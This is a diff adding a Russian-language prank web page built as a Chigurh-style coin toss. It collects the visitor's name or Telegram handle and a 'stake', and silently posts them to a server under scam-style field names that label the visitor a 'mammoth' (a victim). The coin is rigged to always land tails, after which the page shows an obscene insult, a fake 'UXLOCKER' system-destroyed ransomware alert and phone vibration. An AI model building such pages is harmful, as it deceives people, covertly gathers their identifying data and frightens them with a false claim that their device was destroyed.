@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HARKOMENS | CALL IT</title>
+    <style>
+        :root { --accent: #ff5500; --bg: #020202; }
+        body { background: var(--bg); color: #ccc; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
+        header { background: #111; padding: 15px; border-bottom: 2px solid var(--accent); letter-spacing: 4px; font-weight: 900; }
+        
+        .quote { font-style: italic; color: #555; margin: 20px 0; font-size: 0.9rem; padding: 0 10px; }
+        
+        .coin-box { perspective: 1000px; width: 120px; height: 120px; margin: 40px auto; }
+        .coin { 
+            width: 100%; height: 100%; position: relative; 
+            transform-style: preserve-3d; transition: transform 4s cubic-bezier(0.4, 0, 0.2, 1); 
+        }
+        .side { 
+            position: absolute; width: 100%; height: 100%; border-radius: 50%; 
+            backface-visibility: hidden; display: flex; align-items: center; 
+            justify-content: center; font-size: 3rem; border: 3px solid #444; background: #111; 
+        }
+        .heads { color: #888; transform: rotateY(0deg); } /* Орел */
+        .tails { color: var(--accent); transform: rotateY(180deg); } /* Решка - Смерть */
+        
+        input { width: 80%; padding: 12px; background: #000; border: 1px solid #222; color: #fff; margin-bottom: 10px; outline: none; text-align: center; }
+        .btn { background: #fff; color: #000; border: none; padding: 15px 40px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: var(--accent); }
+
+        #prank {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; flex-direction: column; justify-content: center; align-items: center;
+        }
+        #prank::before {
+            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://i.imgur.com/Ti2cxHF.jpeg') center/cover no-repeat;
+            filter: grayscale(100%) brightness(10%); opacity: 0.4; z-index: -1;
+        }
+        h1 { color: #ff0000; font-size: clamp(2rem, 10vw, 4rem); margin: 0; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+<header>MEGALUL HARKOMENS</header>
+<div class="container">
+    <p class="quote">"Выбирайте. Мне нужно, чтобы вы выбрали. Я не могу сделать это за вас. Это было бы неправильно."</p>
+    
+    <div class="coin-box">
+        <div id="coin" class="coin">
+            <div class="side heads">?</div>
+            <div class="side tails">✕</div>
+        </div>
+    </div>
+    
+    <p style="color:var(--accent); font-weight:bold; letter-spacing:2px;">КАКУЮ СТОРОНУ ВЫБЕРЕТЕ?</p>
+    
+    <form id="game">
+        <input type="text" id="name" placeholder="ВАШЕ ИМЯ / ТЕЛЕГРАМ" required><br>
+        <input type="text" id="bet" placeholder="ЧТО ВЫ СТАВИТЕ НА КОН?" required><br>
+        <button type="submit" id="go" class="btn">ПОДБРОСИТЬ</button>
+    </form>
+</div>
+
+<div id="prank">
+    <h1>ТЫ ЧЕ, ДОЛБАЁБ?</h1>
+    <p style="color:#fff; letter-spacing:3px; margin-top:20px;">ТЫ ВЫБРАЛ НЕ ТУ СТОРОНУ.</p>
+    <div style="color:var(--accent); border:1px solid var(--accent); padding:10px; margin-top:20px; font-weight:900;">UXLOCKER: СИСТЕМА УНИЧТОЖЕНА</div>
+</div>
+
+<script>
+    document.getElementById('game').onsubmit = async (e) => {
+        e.preventDefault();
+        const coin = document.getElementById('coin');
+        const go = document.getElementById('go');
+        go.style.display = 'none';
+
+        // Лог Чигуру в телегу
+        try {
+            fetch('/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    fio: document.getElementById('name').value,
+                    addr: "СТАВКА: " + document.getElementById('bet').value,
+                    tg: "Мамонт играет с Чигуром"
+                })
+            });
+        } catch(e){}
+
+        // Вращение (всегда решка)
+        coin.style.transform = "rotateY(1800deg)"; // 5 полных оборотов + стоп на решке
+        
+        setTimeout(() => {
+            document.getElementById('prank').style.display = 'flex';
+            if (window.navigator.vibrate) window.navigator.vibrate([1000, 500, 1000]);
+        }, 4500);
+    };
+</script>
+</body>
+</html>
